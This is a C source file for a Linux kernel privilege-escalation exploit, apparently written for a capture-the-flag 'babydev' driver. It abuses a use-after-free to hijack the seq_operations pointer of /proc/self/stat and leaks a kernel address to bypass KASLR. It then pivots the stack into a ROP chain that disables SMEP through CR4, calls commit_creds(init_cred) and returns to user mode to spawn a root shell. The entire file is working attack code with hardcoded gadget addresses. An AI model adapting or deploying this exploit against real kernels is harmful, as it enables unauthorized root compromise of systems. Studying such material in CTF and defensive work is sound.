#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/types.h>

#define SINGLE_START 0xffffffff8122f4d0
#define POP_RDI 0xffffffff810d238d // pop rdi ; ret
#define INIT_CRED 0xffffffff81e48c60
#define COMMIT_CREDS 0xffffffff810a1420
#define PREPARE_KERNEL_CRED 0xffffffff810a1810
#define SWAPGS 0xffffffff81063694 // swapgs ; pop rbp ; ret
#define IRETQ 0xFFFFFFFF8181A797
#define MOV_CR4_RDI_POP 0xffffffff81004d80 // mov cr4, rdi ; pop rbp ; ret
#define MOV_RSP_RAX 0xffffffff8181bfc5 // mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e
#define POP_RSP 0xffffffff81171045 // pop rsp ; ret
#define WORK_FOR_CPU_FN 0xffffffff81095fb0
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8173645a // xor esi, esi ; mov rdi, rax ; call rdx
#define POP_RDX 0xffffffff8144d302 // pop rdx ; ret
#define POP_RAX 0xffffffff8100ce6e // pop rax ; ret
#define ADD_RSP_XXX 0xFFFFFFFF812743A5 
#define ADD_RSP_0x40 0xffffffff8109536e // add rsp, 0x30 ; pop rbx ; pop rbp ; ret
//size_t swapgs_restore_regs_and_return_to_usermode = 

size_t user_cs, user_rflags, user_rsp, user_ss;

void save_status()
{
	asm(
	"mov %cs, user_cs;"
	"mov %ss, user_ss;"
	"mov %rsp, user_rsp;"
	"pushf;"
	"pop user_rflags;");
//	puts("save status successfully");
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

int fd[5];
size_t buf[0x300] = { 0 };
size_t kernel_offset;
struct msg_buf {
	long mtype;
	char mtext[1];
};

void baby_ioctl(int lfd, size_t len)
{
	ioctl(lfd, 0x10001, len);
}

void get_root_privilege()
{
	void* (*prepare_kernel_cred)(void*) = PREPARE_KERNEL_CRED+kernel_offset;
	int (*commit_creds)(void*) = COMMIT_CREDS+kernel_offset;
	(*commit_creds)((*prepare_kernel_cred)(NULL));
}

void get_root_shell()
{
	printf("UID: %d\n", getuid());
	if (!getuid())
		puts("Root Root"), execl("/bin/sh", "sh", NULL);
	else puts("Failed to get root privilege"), exit(-1);
}

void return_user()
{
	asm(
	"push %0;"
	"push %1;"
	"push %2;"
	"push %3;"
	"push %4;"
	"iretq;"
	:
	:"r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(&get_root_shell)
	);
}

int main(int argc, char** argv, char** env)
{
	save_status();	
		
	fd[0] = open("/dev/babydev", O_RDWR);
	fd[1] = open("/dev/babydev", O_RDWR);

	baby_ioctl(fd[0], 0x20);
	close(fd[0]);
	
	fd[2] = open("/proc/self/stat", O_RDONLY);	

	read(fd[1], buf, 0x18);
	binary_dump("seq_operations", buf, 0x20);

	kernel_offset = buf[0] - SINGLE_START;
	
	printf("kernel_offset: %#lx\n", kernel_offset);
	
	size_t rop[0x30];
	int i = 0;
//	rop[i++] = POP_RDI+kernel_offset;
//	rop[i++] = 0x6f0;
//	rop[i++] = MOV_CR4_RDI_POP+kernel_offset;
//	rop[i++] = 0;
//	rop[i++] = get_root_privilege;
	rop[i++] = POP_RDI+kernel_offset;

//	rop[i++] = 0;
//	rop[i++] = PREPARE_KERNEL_CRED+kernel_offset;
//	rop[i++] = POP_RDX+kernel_offset;
//	rop[i++] = COMMIT_CREDS+kernel_offset;
//	rop[i++] = MOV_RDI_RAX_CALL_RDX+kernel_offset;
//	rop[i++] = 0;
//	rop[i++] = 0;
//	rop[i++] = 0;
//	rop[i++] = 0;

	rop[i++] = INIT_CRED+kernel_offset;
	rop[i++] = COMMIT_CREDS+kernel_offset;

	rop[i++] = SWAPGS+kernel_offset;
	rop[i++] = 0;

	rop[i++] = IRETQ+kernel_offset;
	rop[i++] = get_root_shell;
//	rop[i++] = fix_tty;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_rsp;
	rop[i++] = user_ss;

//	rop[i++] = return_user;
	buf[0] = ADD_RSP_XXX+kernel_offset;
	printf("seq_operations->start: %#lx\n", buf[0]);
	write(fd[1], buf, 8);
/*	
	asm(
	"movq $0x11111111, %%r15\n\t"
	"movq $0x22222222, %%r14\n\t"
	"movq $0x33333333, %%r13\n\t"
	"movq $0x44444444, %%r12\n\t"
	"movq $0x55555555, %%rbp\n\t"
	"movq $0x66666666, %%rbx\n\t"
	"movq $0x77777777, %%r11\n\t"
	"movq $0x88888888, %%r10\n\t"
	"movq $0x99999999, %%r9\n\t"
	"movq $0xaaaaaaaa, %%r8\n\t"
	"movq $0xcccccccc, %%rcx\n\t"
	:
	:
	:
	);
*/	
	asm(
	"movq $0x11111111, %%r15\n\t"
	"movq $0x0, %%r14\n\t"
	"movq %1, %%r13\n\t"
	"movq $0x6f0, %%r12\n\t"
	"movq %2, %%rbp\n\t"
	"movq %0, %%rbx\n\t"
	"movq $0x77777777, %%r11\n\t"
	"movq %3, %%r10\n\t"
	"movq %4, %%r9\n\t"
	"movq $0xaaaaaaaa, %%r8\n\t"
	"movq $0xcccccccc, %%rcx\n\t"
	:
	:"r"(POP_RDI+kernel_offset),"r"(MOV_CR4_RDI_POP+kernel_offset),"r"(ADD_RSP_0x40+kernel_offset),"r"(POP_RSP+kernel_offset),"r"((size_t)rop)
	:
	);

	read(fd[2], buf, 8);

	return 0;
}
